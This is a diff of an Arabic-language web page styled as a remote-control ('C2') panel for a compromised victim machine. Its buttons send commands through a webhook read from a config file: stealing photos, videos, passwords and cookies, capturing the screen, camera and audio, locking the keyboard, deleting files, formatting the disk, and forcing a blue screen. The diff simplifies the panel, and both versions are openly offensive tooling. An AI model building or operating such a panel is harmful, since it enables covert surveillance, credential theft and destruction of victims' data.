@@ -4,75 +4,51 @@
     <meta charset="UTF-8">
     <title>ER0R C2 - ULTIMATE CONTROL</title>
     <style>
-        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
-        .container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; }
-        .section { border: 2px solid #6001d2; padding: 20px; border-radius: 10px; background: #000; width: 300px; }
-        h1 { color: #6001d2; text-shadow: 0 0 10px #6001d2; }
-        h3 { border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .btn { background: #1a1a1a; color: #fff; border: 1px solid #6001d2; padding: 10px; margin: 5px; cursor: pointer; width: 100%; transition: 0.3s; font-weight: bold; }
-        .btn:hover { background: #6001d2; box-shadow: 0 0 15px #6001d2; }
+        body { background: #050505; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
+        .section { border: 2px solid #6001d2; padding: 15px; margin: 10px; border-radius: 10px; display: inline-block; width: 280px; vertical-align: top; }
+        .btn { background: #1a1a1a; color: #fff; border: 1px solid #6001d2; padding: 10px; margin: 5px; cursor: pointer; width: 100%; font-weight: bold; }
+        .btn:hover { background: #6001d2; box-shadow: 0 0 10px #6001d2; }
         .danger { border-color: #f00; color: #f00; }
-        .danger:hover { background: #f00; color: #000; box-shadow: 0 0 15px #f00; }
-        .target-info { color: #f00; font-size: 1.2em; margin-bottom: 20px; }
+        .danger:hover { background: #f00; color: #000; }
     </style>
 </head>
 <body>
-    <h1>📟 مركز السيطرة والتحكم ER0R</h1>
-    <div class="target-info">📍 الهدف: 76.212.2 | الحالة: <span style="color: #0f0;">متصل بشبكة الأوامر</span></div>
+    <h1 style="color: #6001d2;">📟 نظام ER0R للسيطرة الكاملة</h1>
+    <div style="color: red; margin-bottom: 20px;">📍 حالة الهدف: متصل (جاري انتظار الأوامر)</div>
 
-    <div class="container">
-        <div class="section">
-            <h3>📂 سحب البيانات</h3>
-            <button class="btn" onclick="sendCmd('📷 سحب كافة الصور')">سحب الصور 📂</button>
-            <button class="btn" onclick="sendCmd('🎥 سحب ملفات الفيديو')">سحب الفيديو 📽️</button>
-            <button class="btn" onclick="sendCmd('🔑 سحب الكوكيز والباسوردات')">سحب الباسوردات 🔑</button>
-        </div>
+    <div class="section">
+        <h3>📂 سحب البيانات</h3>
+        <button class="btn" onclick="sendCmd('سحب الصور')">سحب الصور 📂</button>
+        <button class="btn" onclick="sendCmd('سحب الفيديو')">سحب الفيديو 🎥</button>
+        <button class="btn" onclick="sendCmd('سحب الباسوردات')">سحب الباسوردات 🔑</button>
+    </div>
 
-        <div class="section">
-            <h3>👁️ مراقبة مباشرة</h3>
-            <button class="btn" onclick="sendCmd('📸 تصوير الشاشة الآن')">تصوير الشاشة 📷</button>
-            <button class="btn" onclick="sendCmd('🎙️ تسجيل صوت المحيط')">تسجيل الصوت 🎤</button>
-            <button class="btn" onclick="sendCmd('🖥️ بدء مشاركة الشاشة (Share)')">بدء الشير 📡</button>
-        </div>
+    <div class="section">
+        <h3>👁️ المراقبة</h3>
+        <button class="btn" onclick="sendCmd('تصوير الشاشة')">تصوير الشاشة 📷</button>
+        <button class="btn" onclick="sendCmd('فتح الكاميرا')">فتح الكاميرا 📸</button>
+        <button class="btn" onclick="sendCmd('بث الشاشة مباشر')">بدء شير الشاشة 📡</button>
+    </div>
 
-        <div class="section">
-            <h3>🎮 التلاعب واللعب</h3>
-            <button class="btn" onclick="sendCmd('🔊 تشغيل صوت مرعب بمستوى 100%')">تشغيل صوت 🔊</button>
-            <button class="btn" onclick="sendCmd('🖱️ عكس حركة الماوس')">عكس الماوس 🖱️</button>
-            <button class="btn" onclick="sendCmd('⌨️ تعطيل لوحة المفاتيح')">قفل الكيبورد ⌨️</button>
-        </div>
-
-        <div class="section">
-            <h3>⚠️ أوامر النظام</h3>
-            <button class="btn danger" onclick="sendCmd('📂 مسح جميع ملفات المجلد الحالي')">العب بالملفات 🗑️</button>
-            <button class="btn danger" onclick="confirm('هل أنت متأكد من تدمير النظام؟') && sendCmd('☢️ بدء فرمتة الجهاز بالكامل')">فرمتة شاملة ☢️</button>
-            <button class="btn danger" onclick="sendCmd('🖥️ إرسال شاشة الموت الزرقاء BSOD')">شاشة الموت 🖥️</button>
-        </div>
+    <div class="section">
+        <h3>☢️ تدمير وتلاعب</h3>
+        <button class="btn danger" onclick="sendCmd('فرمتة الجهاز')">فرمتة شاملة ☢️</button>
+        <button class="btn danger" onclick="sendCmd('شاشة الموت')">شاشة الموت 🖥️</button>
+        <button class="btn" onclick="sendCmd('عكس الماوس')">اللعب بالماوس 🖱️</button>
     </div>
 
     <script>
     async function sendCmd(action) {
-        try {
-            const configRes = await fetch('./data.json');
-            const config = await configRes.json();
-            
-            await fetch(config.webhook_url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    username: "ER0R COMMANDER",
-                    embeds: [{
-                        title: "🚀 أمر سيطرة هجومي",
-                        description: `تم إعطاء أمر: **${action}**\nللضحية: **76.212.2**`,
-                        color: 0xff0000,
-                        footer: { text: "نظام ER0R للتحكم عن بعد" }
-                    }]
-                })
-            });
-            alert("تم إرسال الأمر: " + action);
-        } catch(e) {
-            alert("فشل في إرسال الأمر، تأكد من الويب هوك!");
-        }
+        const configRes = await fetch('./data.json');
+        const config = await configRes.json();
+        await fetch(config.webhook_url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `🚀 **أمر جديد من لوحة التحكم:**\nالهدف: 76.212.2\nالأمر: **${action}**`
+            })
+        });
+        alert("تم إرسال أمر: " + action);
     }
     </script>
 </body>
